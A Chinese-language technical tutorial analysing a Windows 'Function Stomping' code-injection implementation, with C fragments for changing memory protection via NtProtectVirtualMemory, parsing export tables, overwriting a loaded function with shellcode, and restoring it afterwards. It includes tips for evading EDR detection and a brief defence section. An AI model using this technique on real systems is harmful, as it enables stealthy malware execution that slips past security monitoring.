## 概述

Function Stomping 是一种高级代码注入技术，其核心在于直接修改内存中已加载函数的代码，将其替换为自定义 payload，执行后再恢复原始状态。这种技术避免了传统注入方法中分配新内存、创建新线程等容易被检测的行为，利用系统已有模块的合法位置实现隐蔽执行。

想象一下，你有一个经常光顾的咖啡店，店里有一位固定的咖啡师（函数）。你知道他每天早上9点会开始制作第一杯咖啡（函数执行）。现在，你偷偷替换了这位咖啡师，但保留了他的工作台位置（函数地址）。当其他顾客像往常一样在9点来点咖啡时，他们得到的是你安排的人制作的咖啡（执行你的代码），但他们完全察觉不到这个变化。

这就是函数劫持（Function Stomping）的核心思想：​**​替换但保持位置不变​**​。

本文将深入分析一段 Function Stomping 的实现代码，重点讨论其底层技术原理和实现细节，包括系统调用、内存管理、PE 文件结构等底层机制。

## 核心实现原理

### 系统调用绕过

在 Windows 系统中，用户态 API 调用最终会通过 `ntdll.dll`中的系统调用门陷入内核。安全产品（EDR/AV）通常在用户态 API 层设置监控钩子，因此直接调用系统调用函数可以绕过这些监控。

代码中使用 `GetProcAddress`获取 `NtProtectVirtualMemory`的函数指针：

```
typedef NTSTATUS(NTAPI* NtProtectVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect);

NtProtectVirtualMemory = (NtProtectVirtualMemory_t)GetProcAddress(
    GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory");
```

这里的关键在于：

- `BaseAddress`参数是 `PVOID*`类型，因为系统调用可能需要调整内存对齐，函数内部可能会修改传入的地址值。
    
- `RegionSize`是 `PSIZE_T`类型，调用后可能被更新为实际修改的内存区域大小。
    
- 返回值为 `NTSTATUS`，非零值表示失败，需要正确处理错误。
    

### 内存保护机制

Windows 内存保护以页面为单位（通常 4KB），保护标志控制内存的访问权限。代码中需要临时修改内存保护以写入 payload：

```
ULONG oldProtect;
NTSTATUS status = NtProtectVirtualMemory(
    GetCurrentProcess(),
    &address,        // 传入地址的地址
    &size,           // 传入大小的地址
    PAGE_EXECUTE_READWRITE,  // 新保护标志：可执行、可读、可写
    &oldProtect      // 保存旧保护标志
);
```

保护标志的含义：

- `PAGE_NOACCESS`(0x01): 不可访问
    
- `PAGE_READONLY`(0x02): 只读
    
- `PAGE_READWRITE`(0x04): 可读写
    
- `PAGE_EXECUTE`(0x10): 可执行
    
- `PAGE_EXECUTE_READ`(0x20): 可执行+可读
    
- `PAGE_EXECUTE_READWRITE`(0x40): 可执行+可读+可写
    

修改保护标志的模式 `RX → RWX → RX`是可疑行为，容易被安全产品检测。因此，在实战中需要添加延迟或混淆操作。

### PE 文件结构与函数定位

当系统加载 DLL 时，会解析 PE 文件结构，包括导出表（Export Table）来定位导出函数。代码中使用 `GetProcAddress`获取函数地址，但其底层实现是遍历导出表：

```
// 简化版的导出表解析逻辑
PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);
IMAGE_DATA_DIRECTORY exportDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + exportDir.VirtualAddress);

DWORD* functions = (DWORD*)((BYTE*)hModule + exportDirectory->AddressOfFunctions);
DWORD* names = (DWORD*)((BYTE*)hModule + exportDirectory->AddressOfNames);
WORD* ordinals = (WORD*)((BYTE*)hModule + exportDirectory->AddressOfNameOrdinals);

for (DWORD i = 0; i < exportDirectory->NumberOfNames; i++) {
    LPCSTR funcName = (LPCSTR)((BYTE*)hModule + names[i]);
    if (strcmp(funcName, targetFunc) == 0) {
        FARPROC funcAddr = (FARPROC)((BYTE*)hModule + functions[ordinals[i]]);
        break;
    }
}
```

导出表包含函数名、函数地址和序数。`GetProcAddress`会遍历这个表来查找函数。

### 内存布局验证

在修改函数代码前，需要验证目标内存区域是否适合写入：

```
MEMORY_BASIC_INFORMATION mbi;
VirtualQuery(funcAddr, &mbi, sizeof(mbi));

// 检查内存状态是否为已提交
if (mbi.State != MEM_COMMIT) {
    // 内存未提交，不可用
}

// 计算可用空间：从函数地址到内存区域结束
SIZE_T availableSpace = (SIZE_T)mbi.BaseAddress + mbi.RegionSize - (SIZE_T)funcAddr;
if (availableSpace < requiredSize) {
    // 空间不足，可能覆盖相邻函数
}
```

`VirtualQuery`返回的内存信息以页为单位，因此需要确保 payload 不会跨页覆盖其他数据。

## 代码解析

### 初始化系统调用

```
BOOL InitSyscallFunctions() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return FALSE;

    NtProtectVirtualMemory = (NtProtectVirtualMemory_t)GetProcAddress(ntdll, "NtProtectVirtualMemory");
    if (!NtProtectVirtualMemory) return FALSE;

    return TRUE;
}
```

这里直接获取 `ntdll.dll`的模块句柄，避免使用 `LoadLibrary`增加引用计数。`GetProcAddress`用于查找 `NtProtectVirtualMemory`的地址。这个初始化函数写得比较直接。在实际的对抗中，我们通常会更进一步，不是硬编码 `NtProtectVirtualMemory`的函数名，而是通过解析 `ntdll.dll`的导出表，通过​计算系统调用号（SSN）并动态组装 `syscall`指令来发起调用。这样可以避免EDR对 `GetProcAddress`本身进行钩挂或对 `NtProtectVirtualMemory`的调用进行监控。不过，当前代码作为示例和教学目的是完全足够的，它清晰地展示了核心思想。

### 安全加载 DLL

```
HMODULE SecureLoadDll(LPCSTR dllName) {
    char dllPath[MAX_PATH];
    ZeroMemory(dllPath, MAX_PATH);

    UINT sysDirLen = GetSystemDirectoryA(dllPath, MAX_PATH);
    if (sysDirLen == 0 || sysDirLen > MAX_PATH - 10) return NULL;

    dllPath[sysDirLen] = '\\';
    strncpy_s(dllPath + sysDirLen + 1, MAX_PATH - sysDirLen - 1, dllName, MAX_PATH - sysDirLen - 1);

    return LoadLibraryA(dllPath);
}
```

从系统目录加载 DLL 可以避免 DLL 劫持攻击。`GetSystemDirectoryA`获取系统目录路径，然后拼接 DLL 文件名。

### 内存保护修改

```
BOOL SetMemoryProtection(LPVOID address, SIZE_T size, DWORD newProtect, PULONG oldProtect) {
    NTSTATUS status = NtProtectVirtualMemory(
        GetCurrentProcess(),
        &address,  // 传入地址的地址
        (PSIZE_T)&size,  // 传入大小的地址
        newProtect,
        oldProtect
    );
    return (status == 0);
}
```

这是一个包装函数，简化了系统调用的使用。注意 `address`和 `size`都是通过指针传递，因为系统调用可能会修改这些值。

### 函数适用性检查

```
BOOL IsFuncSuitable(FARPROC funcAddr, SIZE_T requiredSize) {
    MEMORY_BASIC_INFORMATION mbi;
    if (VirtualQuery(funcAddr, &mbi, sizeof(mbi))) {
        if (mbi.State != MEM_COMMIT) return FALSE;
        SIZE_T availableSpace = (SIZE_T)mbi.BaseAddress + mbi.RegionSize - (SIZE_T)funcAddr;
        return (availableSpace >= requiredSize);
    }
    return FALSE;
}
```

检查内存区域是否已提交且有足够空间。`mbi.RegionSize`是整个内存区域的大小，从 `mbi.BaseAddress`开始。

### payload 设计

payload 必须是位置无关代码（Position-Independent Code, PIC），因为它将被写入到任意地址执行。文档里的Payload是启动计算器的标准Shellcode。在实际应用中，你需要替换成自己的功能。

payload 通常用汇编编写，然后编译为机器码。例如，一个简单的 payload 可能如下：

```
start:
    call get_addr
get_addr:
    pop ebx
```

在 x64 架构中，可以使用 RIP 相对寻址简化 PIC 设计。

### 执行触发

代码使用 `CreateThread`来执行 payload：

```
HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pTargetFunc, NULL, 0, NULL);
if (hThread) {
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
}
```

这创建了一个新线程来执行目标函数。 Alternatively，可以直接调用函数，但那样可能会破坏栈结构，因此线程更安全。

### 恢复原始状态

执行后，需要恢复原始函数代码和内存保护：

```
memcpy(pTargetFunc, originalBytes, payloadSize);  // 恢复原始字节
ULONG tempProtect;
SetMemoryProtection(pTargetFunc, payloadSize, oldProtect, &tempProtect);  // 恢复保护
```

恢复保护时，使用保存的 `oldProtect`值。注意，这里使用 `tempProtect`作为输出参数，但实际不需要使用其值。

## 防御与检测

从防御角度，可以监控以下行为：

1. ​**​内存保护修改​**​：监控 `NtProtectVirtualMemory`调用，特别是 `RX → RWX → RX`的模式。
    
2. ​**​代码完整性检查​**​：定期校验关键函数的代码哈希值。
    
3. ​**​行为分析​**​：检测函数执行后立即恢复的行为，这可能是恶意操作。
    

例如，可以使用以下代码检查函数是否被修改：

```
BOOL IsFunctionModified(FARPROC funcAddr, const BYTE* expectedCode, SIZE_T size) {
    for (SIZE_T i = 0; i < size; i++) {
        if (((BYTE*)funcAddr)[i] != expectedCode[i]) {
            return TRUE;
        }
    }
    return FALSE;
}
```

## 总结

Function Stomping 是一种高效的代码注入技术，它利用系统已有函数的位置实现隐蔽执行。关键技术点包括：

- 直接系统调用绕过用户态监控
    
- 内存保护修改以允许写入代码
    
- PE 导出表解析定位函数
    
- 内存布局验证确保安全写入
    
- 位置无关代码设计保证正确执行
    

实现时需要注意系统调用的参数传递、内存对齐和错误处理。防御方面，可以监控内存保护修改和代码完整性。

它的缺点​（或者说值得改进的地方）在于其对抗性不足。例如，直接使用 `GetProcAddress`、明显的 `RX->RWX->RX`模式以及固定的目标函数，在现代的EDR面前可能容易被检测。

这种技术体现了对 Windows 系统底层的深刻理解，包括内存管理、PE 文件结构和系统调用机制。掌握这些知识对于高级 Windows 编程和安全研究至关重要。